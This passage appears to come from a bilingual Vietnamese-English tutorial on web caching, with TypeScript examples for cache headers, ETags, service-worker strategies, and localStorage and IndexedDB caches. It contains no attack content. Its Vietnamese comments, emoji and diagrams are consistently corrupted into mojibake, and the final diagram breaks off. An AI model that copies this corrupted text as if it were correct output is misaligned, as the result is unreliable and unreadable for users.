â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                     HTTP CACHE ARCHITECTURE                              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                          â”‚
â”‚  1ï¸âƒ£  BROWSER CACHE (Memory + Disk)                                     â”‚
â”‚      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”       â”‚
â”‚      â”‚  ğŸ“¦ Cache-Control: max-age=3600 (1 hour)               â”‚       â”‚
â”‚      â”‚  ğŸ“¦ Cache-Control: public/private                       â”‚       â”‚
â”‚      â”‚  ğŸ“¦ Cache-Control: no-cache/no-store                    â”‚       â”‚
â”‚      â”‚  ğŸ“¦ ETag: "abc123" (version tag)                        â”‚       â”‚
â”‚      â”‚  ğŸ“¦ Last-Modified: Thu, 01 Jan 2024 00:00:00 GMT        â”‚       â”‚
â”‚      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜       â”‚
â”‚                                                                          â”‚
â”‚  2ï¸âƒ£  SERVICE WORKER CACHE                                              â”‚
â”‚      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”       â”‚
â”‚      â”‚  ğŸš€ Cache First (Static Assets)                         â”‚       â”‚
â”‚      â”‚  ğŸŒ Network First (Dynamic Data)                        â”‚       â”‚
â”‚      â”‚  âš¡ Stale While Revalidate (Balance)                    â”‚       â”‚
â”‚      â”‚  ğŸ“± Cache Only (Offline First)                          â”‚       â”‚
â”‚      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜       â”‚
â”‚                                                                          â”‚
â”‚  3ï¸âƒ£  CDN CACHE (Edge Servers)                                          â”‚
â”‚      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”       â”‚
â”‚      â”‚  ğŸŒ Cloudflare, AWS CloudFront, Fastly                  â”‚       â”‚
â”‚      â”‚  ğŸ“¡ Geographic distribution                             â”‚       â”‚
â”‚      â”‚  âš¡ Edge caching for static assets                      â”‚       â”‚
â”‚      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜       â”‚
â”‚                                                                          â”‚
â”‚  4ï¸âƒ£  APPLICATION CACHE (LocalStorage, IndexedDB)                       â”‚
â”‚      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”       â”‚
â”‚      â”‚  ğŸ’¾ localStorage (5-10MB, synchronous)                  â”‚       â”‚
â”‚      â”‚  ğŸ’¾ sessionStorage (per-tab)                            â”‚       â”‚
â”‚      â”‚  ğŸ’¾ IndexedDB (large data, async)                       â”‚       â”‚
â”‚      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**Code Example:**

```typescript
// ============================================
// 1. HTTP CACHE HEADERS - Server-Side Setup
// ============================================

// Express.js example - Setting cache headers
import express, { Request, Response } from 'express';
import path from 'path';

const app = express();

// ğŸ”¥ Static Assets - Long-term caching (1 nÄƒm)
// Cho cÃ¡c file cÃ³ hash trong tÃªn: app.abc123.js
app.use(
  '/static',
  express.static('public', {
    maxAge: '365d', // Cache 1 nÄƒm
    immutable: true, // BÃ¡o browser file nÃ y khÃ´ng bao giá» thay Ä‘á»•i
    setHeaders: (res: Response, filePath: string) => {
      // Set cache headers chi tiáº¿t
      res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
      res.setHeader('Vary', 'Accept-Encoding'); // Cache riÃªng cho gzip/brotli
    },
  })
);

// ğŸ¯ HTML Files - No cache (luÃ´n kiá»ƒm tra má»›i nháº¥t)
app.get('*.html', (req: Request, res: Response) => {
  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
  res.setHeader('Pragma', 'no-cache'); // HTTP/1.0 backward compatibility
  res.setHeader('Expires', '0'); // Legacy browsers
  res.sendFile(path.join(__dirname, 'public', req.path));
});

// âš¡ API Responses - Short-term caching (5 phÃºt)
app.get('/api/data', (req: Request, res: Response) => {
  const data = { message: 'Hello World', timestamp: Date.now() };

  // Cache 5 phÃºt, nhÆ°ng revalidate vá»›i server
  res.setHeader('Cache-Control', 'public, max-age=300, must-revalidate');

  // ETag Ä‘á»ƒ conditional requests
  const etag = generateETag(data); // Hash cá»§a data
  res.setHeader('ETag', etag);

  // Last-Modified header
  res.setHeader('Last-Modified', new Date().toUTCString());

  // Kiá»ƒm tra If-None-Match header (ETag matching)
  if (req.headers['if-none-match'] === etag) {
    // Data khÃ´ng Ä‘á»•i â†’ 304 Not Modified (khÃ´ng gá»­i body)
    return res.status(304).end();
  }

  res.json(data);
});

// ğŸ“¦ Images - Medium-term caching (1 tuáº§n)
app.use('/images', (req: Request, res: Response, next) => {
  res.setHeader('Cache-Control', 'public, max-age=604800'); // 7 days
  res.setHeader('Vary', 'Accept'); // Cache riÃªng cho WebP/JPEG
  next();
});

// ============================================
// 2. ETAG GENERATION (Táº¡o Version Tag)
// ============================================

import crypto from 'crypto';

function generateETag(data: any): string {
  // Hash ná»™i dung Ä‘á»ƒ táº¡o ETag unique
  const hash = crypto
    .createHash('md5')
    .update(JSON.stringify(data))
    .digest('hex');

  return `"${hash}"`; // ETag format: "abc123"
}

// Sá»­ dá»¥ng ETag cho conditional requests
async function fetchWithETag(url: string, cachedETag?: string): Promise<any> {
  const headers: HeadersInit = {};

  // Gá»­i ETag Ä‘Ã£ cache Ä‘á»ƒ kiá»ƒm tra
  if (cachedETag) {
    headers['If-None-Match'] = cachedETag;
  }

  const response = await fetch(url, { headers });

  // 304 Not Modified â†’ DÃ¹ng cached data
  if (response.status === 304) {
    console.log('âœ… Sá»­ dá»¥ng cached data (304 Not Modified)');
    return null; // KhÃ´ng cÃ³ data má»›i
  }

  // 200 OK â†’ Data má»›i, lÆ°u ETag
  const newETag = response.headers.get('ETag');
  const data = await response.json();

  console.log('ğŸ“¥ Data má»›i, lÆ°u ETag:', newETag);

  return { data, etag: newETag };
}

// ============================================
// 3. BROWSER CACHE API - Client-Side Caching
// ============================================

// ğŸ”¥ Cache Manager Class
class CacheManager {
  private cacheName = 'my-app-cache-v1';

  // LÆ°u response vÃ o cache
  async cacheResponse(url: string, response: Response): Promise<void> {
    try {
      const cache = await caches.open(this.cacheName);

      // Clone response vÃ¬ response.body chá»‰ Ä‘á»c Ä‘Æ°á»£c 1 láº§n
      await cache.put(url, response.clone());

      console.log(`âœ… Cached: ${url}`);
    } catch (error) {
      console.error('âŒ Cache error:', error);
    }
  }

  // Láº¥y response tá»« cache
  async getCachedResponse(url: string): Promise<Response | undefined> {
    try {
      const cache = await caches.open(this.cacheName);
      const cachedResponse = await cache.match(url);

      if (cachedResponse) {
        console.log(`âœ… Cache hit: ${url}`);
        return cachedResponse;
      }

      console.log(`âŒ Cache miss: ${url}`);
      return undefined;
    } catch (error) {
      console.error('âŒ Cache read error:', error);
      return undefined;
    }
  }

  // XÃ³a cache cÅ©
  async clearOldCaches(): Promise<void> {
    const cacheNames = await caches.keys();

    await Promise.all(
      cacheNames.map((name) => {
        // XÃ³a cache khÃ´ng pháº£i version hiá»‡n táº¡i
        if (name !== this.cacheName) {
          console.log(`ğŸ—‘ï¸ Deleting old cache: ${name}`);
          return caches.delete(name);
        }
      })
    );
  }

  // Cache nhiá»u URLs cÃ¹ng lÃºc
  async cacheUrls(urls: string[]): Promise<void> {
    const cache = await caches.open(this.cacheName);
    await cache.addAll(urls); // Tá»± Ä‘á»™ng fetch vÃ  cache
    console.log(`âœ… Cached ${urls.length} URLs`);
  }
}

// Sá»­ dá»¥ng Cache Manager
const cacheManager = new CacheManager();

// Fetch vá»›i cache fallback
async function fetchWithCache(url: string): Promise<any> {
  try {
    // 1. Kiá»ƒm tra cache trÆ°á»›c
    const cachedResponse = await cacheManager.getCachedResponse(url);

    if (cachedResponse) {
      return await cachedResponse.json();
    }

    // 2. Cache miss â†’ Fetch tá»« network
    const response = await fetch(url);

    // 3. LÆ°u vÃ o cache cho láº§n sau
    await cacheManager.cacheResponse(url, response);

    return await response.json();
  } catch (error) {
    console.error('âŒ Fetch error:', error);
    throw error;
  }
}

// ============================================
// 4. SERVICE WORKER CACHE STRATEGIES
// ============================================

// ğŸ“ service-worker.ts

// Strategy 1: Cache First (Offline-first, cho static assets)
async function cacheFirst(request: Request): Promise<Response> {
  // 1. Kiá»ƒm tra cache trÆ°á»›c
  const cachedResponse = await caches.match(request);

  if (cachedResponse) {
    console.log('âœ… Cache hit:', request.url);
    return cachedResponse;
  }

  // 2. Cache miss â†’ Fetch tá»« network
  console.log('ğŸ“¡ Fetching:', request.url);
  const networkResponse = await fetch(request);

  // 3. LÆ°u vÃ o cache cho láº§n sau
  const cache = await caches.open('static-v1');
  cache.put(request, networkResponse.clone());

  return networkResponse;
}

// Strategy 2: Network First (Cho dynamic data)
async function networkFirst(request: Request): Promise<Response> {
  try {
    // 1. Thá»­ fetch tá»« network trÆ°á»›c
    const networkResponse = await fetch(request);

    // 2. Update cache vá»›i data má»›i
    const cache = await caches.open('dynamic-v1');
    cache.put(request, networkResponse.clone());

    console.log('ğŸ“¡ Network response:', request.url);
    return networkResponse;
  } catch (error) {
    // 3. Network fail â†’ Fallback to cache
    console.log('âš ï¸ Network failed, using cache');
    const cachedResponse = await caches.match(request);

    if (cachedResponse) {
      return cachedResponse;
    }

    // 4. No cache â†’ Return error page
    return new Response('Offline', { status: 503 });
  }
}

// Strategy 3: Stale While Revalidate (Best of both)
async function staleWhileRevalidate(request: Request): Promise<Response> {
  const cache = await caches.open('swr-v1');

  // 1. Láº¥y cached response (náº¿u cÃ³)
  const cachedResponse = await cache.match(request);

  // 2. Fetch update tá»« network (async, khÃ´ng block)
  const networkResponsePromise = fetch(request).then((response) => {
    // Update cache vá»›i data má»›i
    cache.put(request, response.clone());
    return response;
  });

  // 3. Return cached ngay láº­p tá»©c (stale data)
  // Äá»“ng thá»i update cache á»Ÿ background
  return cachedResponse || networkResponsePromise;
}

// Strategy 4: Cache Only (Offline-only)
async function cacheOnly(request: Request): Promise<Response> {
  const cachedResponse = await caches.match(request);

  if (cachedResponse) {
    return cachedResponse;
  }

  return new Response('Not in cache', { status: 404 });
}

// Strategy 5: Network Only (No caching)
async function networkOnly(request: Request): Promise<Response> {
  return fetch(request);
}

// ============================================
// 5. SERVICE WORKER - Complete Example
// ============================================

// service-worker.ts
const CACHE_VERSION = 'v1';
const CACHE_NAMES = {
  static: `static-${CACHE_VERSION}`,
  dynamic: `dynamic-${CACHE_VERSION}`,
  api: `api-${CACHE_VERSION}`,
};

// Static assets to precache
const STATIC_ASSETS = [
  '/',
  '/index.html',
  '/styles.css',
  '/app.js',
  '/logo.png',
  '/offline.html',
];

// Install event - Precache static assets
self.addEventListener('install', (event: ExtendableEvent) => {
  console.log('ğŸš€ Service Worker installing...');

  event.waitUntil(
    caches
      .open(CACHE_NAMES.static)
      .then((cache) => {
        console.log('ğŸ“¦ Precaching static assets');
        return cache.addAll(STATIC_ASSETS);
      })
      .then(() => {
        // Force activate immediately
        return self.skipWaiting();
      })
  );
});

// Activate event - Clean up old caches
self.addEventListener('activate', (event: ExtendableEvent) => {
  console.log('âœ… Service Worker activated');

  event.waitUntil(
    caches
      .keys()
      .then((cacheNames) => {
        return Promise.all(
          cacheNames.map((cacheName) => {
            // XÃ³a cache khÃ´ng thuá»™c version hiá»‡n táº¡i
            if (!Object.values(CACHE_NAMES).includes(cacheName)) {
              console.log('ğŸ—‘ï¸ Deleting old cache:', cacheName);
              return caches.delete(cacheName);
            }
          })
        );
      })
      .then(() => {
        // Take control of all pages
        return self.clients.claim();
      })
  );
});

// Fetch event - Apply caching strategies
self.addEventListener('fetch', (event: FetchEvent) => {
  const { request } = event;
  const url = new URL(request.url);

  // ğŸ”¥ Strategy selection based on request type
  if (url.pathname.match(/\.(js|css|png|jpg|jpeg|svg|woff2)$/)) {
    // Static assets â†’ Cache First
    event.respondWith(cacheFirst(request));
  } else if (url.pathname.startsWith('/api/')) {
    // API calls â†’ Stale While Revalidate
    event.respondWith(staleWhileRevalidate(request));
  } else if (url.pathname.endsWith('.html') || url.pathname === '/') {
    // HTML pages â†’ Network First
    event.respondWith(networkFirst(request));
  } else {
    // Default â†’ Network Only
    event.respondWith(networkOnly(request));
  }
});

// ============================================
// 6. LOCALSTORAGE CACHING (Simple Client Cache)
// ============================================

interface CacheItem<T> {
  data: T;
  timestamp: number;
  expiry: number; // milliseconds
}

class LocalStorageCache {
  private prefix = 'cache_';

  // LÆ°u data vÃ o localStorage vá»›i expiry time
  set<T>(key: string, data: T, expiryMs: number = 3600000): void {
    // Default 1 hour
    try {
      const item: CacheItem<T> = {
        data,
        timestamp: Date.now(),
        expiry: expiryMs,
      };

      localStorage.setItem(this.prefix + key, JSON.stringify(item));
      console.log(`âœ… Cached to localStorage: ${key}`);
    } catch (error) {
      // localStorage full hoáº·c disabled
      console.error('âŒ localStorage error:', error);
    }
  }

  // Láº¥y data tá»« localStorage
  get<T>(key: string): T | null {
    try {
      const itemStr = localStorage.getItem(this.prefix + key);

      if (!itemStr) {
        return null;
      }

      const item: CacheItem<T> = JSON.parse(itemStr);

      // Kiá»ƒm tra expiry
      const age = Date.now() - item.timestamp;

      if (age > item.expiry) {
        console.log(`â° Cache expired: ${key}`);
        this.remove(key);
        return null;
      }

      console.log(`âœ… Cache hit: ${key}`);
      return item.data;
    } catch (error) {
      console.error('âŒ localStorage read error:', error);
      return null;
    }
  }

  // XÃ³a cache item
  remove(key: string): void {
    localStorage.removeItem(this.prefix + key);
  }

  // Clear all cache items
  clear(): void {
    Object.keys(localStorage).forEach((key) => {
      if (key.startsWith(this.prefix)) {
        localStorage.removeItem(key);
      }
    });
    console.log('ğŸ—‘ï¸ Cleared all cache');
  }

  // Get all cache keys
  keys(): string[] {
    return Object.keys(localStorage)
      .filter((key) => key.startsWith(this.prefix))
      .map((key) => key.replace(this.prefix, ''));
  }
}

// Sá»­ dá»¥ng LocalStorage Cache
const cache = new LocalStorageCache();

async function fetchUserData(userId: string): Promise<any> {
  // 1. Kiá»ƒm tra cache
  const cached = cache.get(`user_${userId}`);

  if (cached) {
    console.log('âœ… Using cached user data');
    return cached;
  }

  // 2. Fetch tá»« API
  console.log('ğŸ“¡ Fetching user data from API');
  const response = await fetch(`/api/users/${userId}`);
  const data = await response.json();

  // 3. Cache data (5 phÃºt)
  cache.set(`user_${userId}`, data, 5 * 60 * 1000);

  return data;
}

// ============================================
// 7. INDEXEDDB CACHING (Large Data)
// ============================================

class IndexedDBCache {
  private dbName = 'my-app-cache';
  private storeName = 'responses';
  private db: IDBDatabase | null = null;

  // Má»Ÿ connection Ä‘áº¿n IndexedDB
  async open(): Promise<void> {
    return new Promise((resolve, reject) => {
      const request = indexedDB.open(this.dbName, 1);

      request.onerror = () => reject(request.error);
      request.onsuccess = () => {
        this.db = request.result;
        resolve();
      };

      request.onupgradeneeded = (event) => {
        const db = (event.target as IDBOpenDBRequest).result;

        // Táº¡o object store
        if (!db.objectStoreNames.contains(this.storeName)) {
          const store = db.createObjectStore(this.storeName, { keyPath: 'url' });
          store.createIndex('timestamp', 'timestamp', { unique: false });
          console.log('ğŸ“¦ Created IndexedDB object store');
        }
      };
    });
  }

  // LÆ°u response vÃ o IndexedDB
  async set(url: string, data: any, expiryMs: number = 3600000): Promise<void> {
    if (!this.db) await this.open();

    return new Promise((resolve, reject) => {
      const transaction = this.db!.transaction([this.storeName], 'readwrite');
      const store = transaction.objectStore(this.storeName);

      const item = {
        url,
        data,
        timestamp: Date.now(),
        expiry: expiryMs,
      };

      const request = store.put(item);

      request.onsuccess = () => {
        console.log(`âœ… Cached to IndexedDB: ${url}`);
        resolve();
      };

      request.onerror = () => reject(request.error);
    });
  }

  // Láº¥y data tá»« IndexedDB
  async get<T>(url: string): Promise<T | null> {
    if (!this.db) await this.open();

    return new Promise((resolve, reject) => {
      const transaction = this.db!.transaction([this.storeName], 'readonly');
      const store = transaction.objectStore(this.storeName);

      const request = store.get(url);

      request.onsuccess = () => {
        const item = request.result;

        if (!item) {
          resolve(null);
          return;
        }

        // Kiá»ƒm tra expiry
        const age = Date.now() - item.timestamp;

        if (age > item.expiry) {
          console.log(`â° Cache expired: ${url}`);
          this.remove(url);
          resolve(null);
          return;
        }

        console.log(`âœ… Cache hit: ${url}`);
        resolve(item.data);
      };

      request.onerror = () => reject(request.error);
    });
  }

  // XÃ³a item
  async remove(url: string): Promise<void> {
    if (!this.db) await this.open();

    return new Promise((resolve, reject) => {
      const transaction = this.db!.transaction([this.storeName], 'readwrite');
      const store = transaction.objectStore(this.storeName);

      const request = store.delete(url);

      request.onsuccess = () => resolve();
      request.onerror = () => reject(request.error);
    });
  }

  // Clear all data
  async clear(): Promise<void> {
    if (!this.db) await this.open();

    return new Promise((resolve, reject) => {
      const transaction = this.db!.transaction([this.storeName], 'readwrite');
      const store = transaction.objectStore(this.storeName);

      const request = store.clear();

      request.onsuccess = () => {
        console.log('ğŸ—‘ï¸ Cleared IndexedDB cache');
        resolve();
      };

      request.onerror = () => reject(request.error);
    });
  }
}

// ============================================
// 8. CACHE INVALIDATION STRATEGIES
// ============================================

class CacheInvalidation {
  // Time-based invalidation
  static async invalidateByTime(maxAge: number): Promise<void> {
    const cache = await caches.open('api-v1');
    const requests = await cache.keys();

    for (const request of requests) {
      const response = await cache.match(request);
      if (!response) continue;

      const dateHeader = response.headers.get('Date');
      if (!dateHeader) continue;

      const age = Date.now() - new Date(dateHeader).getTime();

      if (age > maxAge) {
        await cache.delete(request);
        console.log(`ğŸ—‘ï¸ Invalidated: ${request.url}`);
      }
    }
  }

  // Version-based invalidation
  static async invalidateByVersion(newVersion: string): Promise<void> {
    const cacheNames = await caches.keys();

    for (const cacheName of cacheNames) {
      if (!cacheName.includes(newVersion)) {
        await caches.delete(cacheName);
        console.log(`ğŸ—‘ï¸ Deleted old cache: ${cacheName}`);
      }
    }
  }

  // Pattern-based invalidation
  static async invalidateByPattern(pattern: RegExp): Promise<void> {
    const cache = await caches.open('api-v1');
    const requests = await cache.keys();

    for (const request of requests) {
      if (pattern.test(request.url)) {
        await cache.delete(request);
        console.log(`ğŸ—‘ï¸ Invalidated: ${request.url}`);
      }
    }
  }

  // Manual invalidation with tags
  static async invalidateByTags(tags: string[]): Promise<void> {
    // Implement tag-based cache invalidation
    // Requires storing tags with cached items
    const cache = await caches.open('tagged-cache');
    const requests = await cache.keys();

    for (const request of requests) {
      const response = await cache.match(request);
      if (!response) continue;

      const cachedTags = response.headers.get('X-Cache-Tags')?.split(',') || [];

      // Check if any tag matches
      if (tags.some((tag) => cachedTags.includes(tag))) {
        await cache.delete(request);
        console.log(`ğŸ—‘ï¸ Invalidated by tags: ${request.url}`);
      }
    }
  }
}

// ============================================
// 9. REACT QUERY / SWR INTEGRATION (Modern Approach)
// ============================================

// ğŸ”¥ Using React Query for automatic caching
import { useQuery, useQueryClient } from '@tanstack/react-query';

function useUserData(userId: string) {
  return useQuery({
    queryKey: ['user', userId],
    queryFn: () => fetch(`/api/users/${userId}`).then((res) => res.json()),
    staleTime: 5 * 60 * 1000, // 5 phÃºt - data cÃ²n "fresh"
    cacheTime: 10 * 60 * 1000, // 10 phÃºt - giá»¯ trong cache
    refetchOnWindowFocus: true, // Refetch khi user quay láº¡i tab
    retry: 3, // Retry 3 láº§n náº¿u fail
  });
}

// Invalidate cache
function InvalidateExample() {
  const queryClient = useQueryClient();

  const handleUpdate = () => {
    // Invalidate specific query
    queryClient.invalidateQueries({ queryKey: ['user'] });

    // Or refetch
    queryClient.refetchQueries({ queryKey: ['user', '123'] });

    // Or update cache directly
    queryClient.setQueryData(['user', '123'], { name: 'New Name' });
  };

  return <button onClick={handleUpdate}>Update</button>;
}

// ============================================
// 10. COMPREHENSIVE CACHE STRATEGY
// ============================================

class ComprehensiveCacheStrategy {
  private browserCache = new CacheManager();
  private localStorage = new LocalStorageCache();
  private indexedDB = new IndexedDBCache();

  async fetch<T>(url: string, options?: {
    strategy?: 'cache-first' | 'network-first' | 'stale-while-revalidate';
    maxAge?: number;
    useIndexedDB?: boolean;
  }): Promise<T> {
    const { 
      strategy = 'cache-first',
      maxAge = 3600000, // 1 hour
      useIndexedDB = false 
    } = options || {};

    const cacheKey = url;

    // 1. Check localStorage cache (fastest)
    if (!useIndexedDB) {
      const cached = this.localStorage.get<T>(cacheKey);
      if (cached && strategy === 'cache-first') {
        return cached;
      }
    }

    // 2. Check IndexedDB cache (for large data)
    if (useIndexedDB) {
      const cached = await this.indexedDB.get<T>(cacheKey);
      if (cached && strategy === 'cache-first') {
        return cached;
      }
    }

    // 3. Fetch from network
    try {
      const response = await fetch(url);
      const data = await response.json();

      // 4. Update caches
      if (useIndexedDB) {
        await this.indexedDB.set(cacheKey, data, maxAge);
      } else {
        this.localStorage.set(cacheKey, data, maxAge);
      }

      return data;
    } catch (error) {
      // 5. Network failed - try cache as fallback
      if (strategy === 'network-first') {
        const cached = useIndexedDB
          ? await this.indexedDB.get<T>(cacheKey)
          : this.localStorage.get<T>(cacheKey);

        if (cached) {
          console.log('âš ï¸ Using stale cache due to network error');
          return cached;
        }
      }

      throw error;
    }
  }
}

// Usage
const cacheStrategy = new ComprehensiveCacheStrategy();

// Fetch vá»›i cache strategy
const userData = await cacheStrategy.fetch('/api/user/123', {
  strategy: 'cache-first',
  maxAge: 5 * 60 * 1000, // 5 minutes
});

const largeData = await cacheStrategy.fetch('/api/large-dataset', {
  strategy: 'stale-while-revalidate',
  maxAge: 30 * 60 * 1000, // 30 minutes
  useIndexedDB: true, // Use IndexedDB for large data
});
```

**ğŸ¯ Best Practices (Thá»±c HÃ nh Tá»‘t):**

1. **âœ… Cache static assets aggressively** vá»›i long-term cache headers (1 year)
2. **âœ… Use versioned filenames** (app.abc123.js) Ä‘á»ƒ avoid cache invalidation issues
3. **âœ… Cache HTML minimally** hoáº·c khÃ´ng cache Ä‘á»ƒ luÃ´n cÃ³ latest version
4. **âœ… Use ETag/Last-Modified** cho efficient conditional requests
5. **âœ… Implement proper cache invalidation** strategy
6. **âœ… Use Service Worker** cho offline support vÃ  advanced caching
7. **âœ… Set Vary headers** cho content negotiation (gzip, WebP, etc.)
8. **âœ… Use CDN caching** cho global performance
9. **âœ… Monitor cache hit rates** Ä‘á»ƒ optimize strategy
10. **âœ… Clear old caches** regularly Ä‘á»ƒ avoid storage bloat

**âŒ Common Mistakes (Lá»—i ThÆ°á»ng Gáº·p):**

```typescript
// âŒ Lá»–I 1: Cache HTML files vá»›i long expiry
// HTML nÃªn luÃ´n fresh Ä‘á»ƒ cÃ³ latest version
res.setHeader('Cache-Control', 'public, max-age=31536000'); // âŒ Sai!

// âœ… ÄÃšNG: No-cache cho HTML
res.setHeader('Cache-Control', 'no-cache, must-revalidate');

// âŒ Lá»–I 2: KhÃ´ng use versioned filenames
// <script src="app.js"></script> âŒ Cache invalidation khÃ³

// âœ… ÄÃšNG: Use hash in filename
// <script src="app.abc123.js"></script> âœ…

// âŒ Lá»–I 3: Cache sensitive data in browser
localStorage.setItem('authToken', token); // âŒ Insecure!

// âœ… ÄÃšNG: Use httpOnly cookies hoáº·c sessionStorage
sessionStorage.setItem('tempData', data); // âœ… Better

// âŒ Lá»–I 4: KhÃ´ng handle cache invalidation
// Cache forever without invalidation plan âŒ

// âœ… ÄÃšNG: Implement version-based or time-based invalidation
CacheInvalidation.invalidateByVersion('v2'); // âœ…

// âŒ Lá»–I 5: Cache API responses without expiry
cache.set('users', data); // âŒ No expiry!

// âœ… ÄÃšNG: Always set expiry time
cache.set('users', data, 5 * 60 * 1000); // âœ… 5 minutes

// âŒ Lá»–I 6: KhÃ´ng check storage quota
localStorage.setItem('largeData', hugeString); // âŒ CÃ³ thá»ƒ fail!

// âœ… ÄÃšNG: Handle QuotaExceededError
try {
  localStorage.setItem('data', value);
} catch (error) {
  if (error.name === 'QuotaExceededError') {
    // Clear old cache or use IndexedDB
    cache.clear();
  }
}

// âŒ Lá»–I 7: Cache everything vá»›i same strategy
// One size doesn't fit all âŒ

// âœ… ÄÃšNG: Different strategies cho different content types
if (isStaticAsset) {
  strategy = 'cache-first';
} else if (isAPI) {
  strategy = 'stale-while-revalidate';
} else if (isHTML) {
  strategy = 'network-first';
}
```

**ğŸ“Š Cache Strategy Decision Tree:**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                  CHá»ŒN CACHE STRATEGY NÃ€O?                        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                  â”‚
â”‚  ğŸ“¦ Static Assets (JS, CSS, Images)?                            â”‚
â”‚  â”œâ”€ Has hash in filename? (app.abc123.js)                       â”‚
â”‚  â”‚  â””â”€âœ… Cache First + Long expiry (1 year)                     â”‚
â”‚  â””â”€ No hash?                                                     â”‚
â”‚     â””â”€âš¡ Short expiry (1 day) + ETag                            â”‚
â”‚                                                                  â”‚
â”‚  ğŸ“„ HTML Pages?                                                  â”‚
â”‚  â””â”€âœ… Network First + No-cache                                   â”‚
â”‚     (Always get latest version)                                  â”‚
â”‚                                                                  â”‚
â”‚  ğŸŒ API Responses?                                               â”‚
â”‚  â”œâ”€ Rarely changes? (config, constants)                         â”‚
â”‚  â”‚  â””â”€âœ… Cache First + Medium expiry (1 hour)                   â”‚
â”‚  â”œâ”€ Changes often? (user data, feed)                            â”‚
â”‚  â”‚  â””â”€âš¡ Stale While Revalidate (show old, fetch new)          â”‚
â”‚  â””â”€ Real-time? (notifications, messages)                        â”‚
â”‚     â””â”€ğŸ”´ Network Only (no caching)                              â”‚
â”‚                                                                  â”‚
â”‚  ğŸ’¾ Large Data? (> 5MB)                                          â”‚
